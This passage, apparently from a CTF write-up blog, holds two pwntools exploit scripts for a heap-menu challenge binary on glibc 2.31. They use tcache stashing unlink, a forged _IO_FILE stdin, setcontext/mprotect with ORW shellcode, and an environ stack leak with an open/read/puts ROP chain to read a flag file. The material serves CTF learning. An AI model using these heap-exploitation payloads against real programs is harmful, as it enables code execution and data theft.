class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>banary = <span class="hljs-string">&quot;./tototo&quot;</span><br>elf = ELF(banary)<br>ip = <span class="hljs-string">&#x27;1&#x27;</span><br>port = <span class="hljs-number">1</span><br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span>(local==<span class="hljs-number">1</span>):<br>p = process(banary)<br><span class="hljs-keyword">else</span>:<br>p = remote(ip, port)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>gdb.attach(p)<br>pause()<br><br>s = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>sl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : p.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : p.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : p.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : p.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(p.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg = <span class="hljs-keyword">lambda</span> s : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>pi = <span class="hljs-keyword">lambda</span> : p.interactive()<br><span class="hljs-comment">#------------------------   ----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>ru(<span class="hljs-string">&#x27;is:&#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(choice))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>menu(<span class="hljs-number">1</span>)<br>ru(<span class="hljs-string">&#x27;index?&#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br>ru(<span class="hljs-string">&#x27;size?&#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>menu(<span class="hljs-number">2</span>)<br>ru(<span class="hljs-string">&#x27;one?&#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, con=p64(<span class="hljs-params"><span class="hljs-number">0xdeadbeef</span></span>)</span>):<br>menu(<span class="hljs-number">3</span>)<br>ru(<span class="hljs-string">&#x27;one?&#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br>ru(<span class="hljs-string">&#x27;content?&#x27;</span>)<br>sl(con)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>menu(<span class="hljs-number">4</span>)<br>ru(<span class="hljs-string">&#x27;one?&#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calloc</span>(<span class="hljs-params">index, size</span>):<br>menu(<span class="hljs-number">5</span>)<br>ru(<span class="hljs-string">&#x27;index?&#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br>ru(<span class="hljs-string">&#x27;size?&#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-comment">#------------------------ leak_libc   ----------------------------</span><br>calloc(<span class="hljs-number">10</span>, <span class="hljs-number">0x500</span>)<br>calloc(<span class="hljs-number">0</span>, <span class="hljs-number">0x5d0</span>) <span class="hljs-comment">#calloc_1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, <span class="hljs-number">7</span>): <span class="hljs-comment">#malloc_5</span><br>add(i, <span class="hljs-number">0x2e0</span>)<br><br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>libc_base=uu64()-<span class="hljs-number">96</span>-<span class="hljs-number">0x10</span>-libc.sym[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br><br>mp = libc_base+ <span class="hljs-number">0x1EC2D0</span><br>lg(<span class="hljs-string">&#x27;mp&#x27;</span>)<br><br>stdin = libc_base+ libc.sym[<span class="hljs-string">&quot;_IO_2_1_stdin_&quot;</span>]<br>lg(<span class="hljs-string">&#x27;stdin&#x27;</span>)<br><br><span class="hljs-comment">#------------------------ Tcache Stashing Unlink  ---------------</span><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x2e0</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x2e0</span>) <span class="hljs-comment">#malloc_7</span><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>free(i)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>calloc(i , <span class="hljs-number">0x2e0</span>) <br><br>free(<span class="hljs-number">0</span>) <span class="hljs-comment">#chunk0, one_smallbin</span><br>free(<span class="hljs-number">2</span>) <span class="hljs-comment">#chunk2, seconde_smallbin</span><br><br><span class="hljs-comment">#chunk2 -&gt; chunk0 </span><br>calloc(<span class="hljs-number">4</span>, <span class="hljs-number">0x500</span>)<br>add(<span class="hljs-number">7</span>, <span class="hljs-number">0x2e0</span>)    <span class="hljs-comment">#take a tcache</span><br><br>edit(<span class="hljs-number">2</span>,p64(mp&gt;&gt;<span class="hljs-number">8</span>)) <span class="hljs-comment">#chunk2_bk -&gt; mp_.tcache_bins - 0x10</span><br><br><br>calloc(<span class="hljs-number">12</span>, <span class="hljs-number">0x2e0</span>)  <span class="hljs-comment">#ATTACK, change mp</span><br>    <span class="hljs-comment">#Tcache bin: chunk2 -&gt; chunk0</span><br>    <span class="hljs-comment">#Small bin : chunk2 -&gt; chunk0</span><br><br><span class="hljs-comment">#calloc_7, malloc_7</span><br><br><span class="hljs-comment">#------------------------  Gadget  ----------------------------</span><br>malloc_hook=libc_base+libc.symbols[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]<br><br>setcontext = libc_base+libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br><br>stdin=libc_base+libc.sym[<span class="hljs-string">&quot;_IO_2_1_stdin_&quot;</span>]<br><br>malloc_hook_base=malloc_hook&amp;<span class="hljs-number">0xfffffffffffff000</span> <span class="hljs-comment">#内存⻚对⻬</span><br>lg(<span class="hljs-string">&#x27;malloc_hook_base&#x27;</span>)<br><br>_IO_str_jumps = libc_base + <span class="hljs-number">0x1E9560</span> <span class="hljs-comment">#_IO_str_jumps</span><br>lg(<span class="hljs-string">&#x27;_IO_str_jumps&#x27;</span>)<br><span class="hljs-comment">#------------------------  fake_IO_stdin  ----------------------------</span><br>fake_io = p64(<span class="hljs-number">0xfbad1800</span>) <span class="hljs-comment">#flag</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_IO_read_ptr</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_IO_read_end</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_IO_read_base</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_IO_write_base</span><br>fake_io += p64(stdin+<span class="hljs-number">0xe0</span>) <span class="hljs-comment">#_IO_write_ptr: _IO_wide_data_0</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_IO_write_end</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_IO_buf_base</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_IO_buf_end</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_IO_save_base</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_IO_backup_base</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_IO_save_end</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_markers</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_chain</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_fileno</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_flags2</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_old_offset</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_cur_column</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_vtable_offset</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_shortbuf</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_lock</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_offset</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_codecvt</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_wide_data</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_freeres_list</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_freeres_buf</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#__pad5</span><br>fake_io += p64(_IO_str_jumps) <span class="hljs-comment">#vtable</span><br><br><br><span class="hljs-comment">#------------------------  mprotect  ----------------------------</span><br>frame = SigreturnFrame()<br>frame.rdi = malloc_hook_base<br>frame.rsi = <span class="hljs-number">0x1000</span><br>frame.rdx = <span class="hljs-number">7</span><br>frame.rsp = malloc_hook + <span class="hljs-number">0x8</span><br>frame.rip = libc_base + libc.symbols[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br><br>chunk_edit= <span class="hljs-built_in">bytes</span>(frame)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(chunk_edit)))<br><br><span class="hljs-comment">#------------------------  ORW_shellcode  ----------------------------</span><br>shell = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string"> xor rsi,rsi</span><br><span class="hljs-string"> mov rax,SYS_open</span><br><span class="hljs-string"> call start</span><br><span class="hljs-string"> .string &quot;./flag&quot;</span><br><span class="hljs-string"> </span><br><span class="hljs-string"> start:</span><br><span class="hljs-string"> pop rdi</span><br><span class="hljs-string"> syscall</span><br><span class="hljs-string"> mov rdi,rax</span><br><span class="hljs-string"> mov rsi,rsp</span><br><span class="hljs-string"> mov rdx,0x100</span><br><span class="hljs-string"> mov rax,SYS_read</span><br><span class="hljs-string"> syscall</span><br><span class="hljs-string"> mov rdi,1</span><br><span class="hljs-string"> mov rsi,rsp</span><br><span class="hljs-string"> mov rdx,0x100</span><br><span class="hljs-string"> mov rax,SYS_write</span><br><span class="hljs-string"> syscall</span><br><span class="hljs-string"> mov rax,SYS_exit</span><br><span class="hljs-string"> syscall</span><br><span class="hljs-string"> &quot;&quot;&quot;</span><br><br>payload = fake_io     <span class="hljs-comment">#0xe0</span><br>payload += chunk_edit <span class="hljs-comment">#0xf8</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>   <span class="hljs-comment">#0x18</span><br>payload += p64(setcontext+<span class="hljs-number">61</span>)  <span class="hljs-comment">#malloc_hook</span><br>payload += p64(malloc_hook+<span class="hljs-number">0x10</span>) <span class="hljs-comment">#malloc_hook+8</span><br>payload += asm(shell)<br><br><span class="hljs-comment">#------------------------  Attack  ----------------------------</span><br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x300</span>) <span class="hljs-comment">#malloc_9</span><br><br>free(<span class="hljs-number">10</span>) <span class="hljs-comment">#set chunk10 in tcache_bins</span><br><br>edit(<span class="hljs-number">10</span>, <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">7</span> + p64(stdin-<span class="hljs-number">0x10</span>)*<span class="hljs-number">0x50</span>) <span class="hljs-comment">#tcache_bk -&gt; IO_stdin</span><br><br>add(<span class="hljs-number">10</span> , <span class="hljs-number">0x500</span>)<br><br>edit(<span class="hljs-number">10</span>, <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">7</span> + payload)<br>debug()<br><br>menu(<span class="hljs-number">1</span>) <span class="hljs-comment">#malloc_11--&gt; exit</span><br><br>pi()<br></code></pre></td></tr></table></figure><h3 id="exp2-environ"><a href="#exp2-environ" class="headerlink" title="exp2-environ"></a>exp2-environ</h3><p>通过environ，泄露栈地址，通过这个地址<strong>计算edit函数中调用read_con时的返回地址</strong></p><p>在其ret处布置orw链子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>banary = <span class="hljs-string">&quot;./tototo&quot;</span><br>elf = ELF(banary)<br>ip = <span class="hljs-string">&#x27;1&#x27;</span><br>port = <span class="hljs-number">1</span><br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span>(local==<span class="hljs-number">1</span>):<br>p = process(banary)<br><span class="hljs-keyword">else</span>:<br>p = remote(ip, port)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>gdb.attach(p)<br>pause()<br><br>s = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>sl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : p.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : p.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : p.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : p.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(p.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg = <span class="hljs-keyword">lambda</span> s : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>pi = <span class="hljs-keyword">lambda</span> : p.interactive()<br><span class="hljs-comment">#------------------------   ----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>ru(<span class="hljs-string">&#x27;is:&#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(choice))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>menu(<span class="hljs-number">1</span>)<br>ru(<span class="hljs-string">&#x27;index?&#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br>ru(<span class="hljs-string">&#x27;size?&#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>menu(<span class="hljs-number">2</span>)<br>ru(<span class="hljs-string">&#x27;one?&#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, con=p64(<span class="hljs-params"><span class="hljs-number">0xdeadbeef</span></span>)</span>):<br>menu(<span class="hljs-number">3</span>)<br>ru(<span class="hljs-string">&#x27;one?&#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br>ru(<span class="hljs-string">&#x27;content?&#x27;</span>)<br>sl(con)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>menu(<span class="hljs-number">4</span>)<br>ru(<span class="hljs-string">&#x27;one?&#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calloc</span>(<span class="hljs-params">index, size</span>):<br>menu(<span class="hljs-number">5</span>)<br>ru(<span class="hljs-string">&#x27;index?&#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br>ru(<span class="hljs-string">&#x27;size?&#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-comment">#------------------- libc &amp; heap &amp; stack   -------------------</span><br><span class="hljs-comment">#libc_base</span><br>calloc(<span class="hljs-number">0</span>, <span class="hljs-number">0x620</span>)<br>calloc(<span class="hljs-number">1</span>, <span class="hljs-number">0x200</span>)<br>free(<span class="hljs-number">0</span>)<br><br>show(<span class="hljs-number">0</span>)<br>libc_base = uu64() - <span class="hljs-number">0x70</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br><br><span class="hljs-comment">#heap_base</span><br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x208</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x208</span>)<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x208</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">3</span>)<br><br>show(<span class="hljs-number">3</span>)<br>p.recvline()<br>heap_base = u64(p.recvuntil(<span class="hljs-string">b&quot;\n&quot;</span>).strip().ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))-<span class="hljs-number">0x8d0</span><br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>)<br><br><span class="hljs-comment">#stack</span><br>environ = libc_base + libc.sym[<span class="hljs-string">&#x27;environ&#x27;</span>]<br>lg(<span class="hljs-string">&#x27;environ&#x27;</span>)<br><br>edit(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">7</span>+<span class="hljs-number">0x1F8</span>) + p64(<span class="hljs-number">0x211</span>) + p64(environ) )  <span class="hljs-comment">#3 --&gt; environ</span><br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x200</span>)<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x200</span>)<br><br>show(<span class="hljs-number">5</span>)<br>stack = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;stack&#x27;</span>)<br><br>rbp = stack - <span class="hljs-number">0x108</span> <span class="hljs-comment">#0xdfb0</span><br>edit_rbp = stack - <span class="hljs-number">0x128</span> <span class="hljs-comment">#0xdf90</span><br>edit_ret = stack - <span class="hljs-number">0x120</span> <span class="hljs-comment">#0xdf98</span><br>lg(<span class="hljs-string">&#x27;edit_rbp&#x27;</span>)<br>lg(<span class="hljs-string">&#x27;edit_ret&#x27;</span>)<br><br>edit_read_rbp = stack - <span class="hljs-number">0x148</span> <span class="hljs-comment">#0xdf70</span><br>edit_read_ret = stack - <span class="hljs-number">0x140</span> <span class="hljs-comment">#0xdf78</span><br>lg(<span class="hljs-string">&#x27;edit_read_ret&#x27;</span>)<br><span class="hljs-comment">#---------------------- stack + ORW ---------------------------</span><br>free(<span class="hljs-number">4</span>)<br>free(<span class="hljs-number">3</span>)<br><br><span class="hljs-comment">#edit_ret -&gt; orw: find a chunk size=1</span><br><span class="hljs-comment">#canary</span><br>edit(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">7</span>+<span class="hljs-number">0x1F8</span>) + p64(<span class="hljs-number">0x211</span>)+ p64(edit_read_rbp-<span class="hljs-number">0x8</span>)) <span class="hljs-comment">#0xdf68</span><br><br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x200</span>)<br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">6</span>, <span class="hljs-number">0x200</span>) <br><span class="hljs-comment">#debug()</span><br><span class="hljs-comment">#ORW</span><br>pop_rdi = libc_base + <span class="hljs-number">0x0000000000026b72</span> <span class="hljs-comment"># pop rdi ; ret</span><br>pop_rdx = libc_base + <span class="hljs-number">0x000000000011c371</span> <span class="hljs-comment"># pop rdx ; pop r12 ; ret</span><br>pop_rsi = libc_base + <span class="hljs-number">0x0000000000027529</span> <span class="hljs-comment"># pop rsi ; ret</span><br>pop_rax = libc_base + <span class="hljs-number">0x000000000004a550</span> <span class="hljs-comment"># pop rax ; ret</span><br>syscall = libc_base + <span class="hljs-number">0x000000000002584d</span><br>lg(<span class="hljs-string">&#x27;pop_rdi&#x27;</span>)<br><span class="hljs-comment">#ret = libc_base + 0x0000000000022679</span><br>open_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>puts_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br><span class="hljs-comment">#edit_read_rbp-0x8: canary</span><br>payload =  <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">7</span>  <span class="hljs-comment">#rbp</span><br>payload += flat([<br>pop_rdi, edit_read_rbp+<span class="hljs-number">0x88</span> , pop_rsi, <span class="hljs-number">0</span>, open_addr, <span class="hljs-comment">#ret--&gt;pop rdi</span><br>pop_rdi, <span class="hljs-number">3</span>, pop_rsi, heap_base+<span class="hljs-number">0x2b0</span>, pop_rdx, <span class="hljs-number">0xff</span>, <span class="hljs-number">0</span>, read_addr ,<br>pop_rdi, heap_base+<span class="hljs-number">0x2b0</span>, puts_addr,<br><span 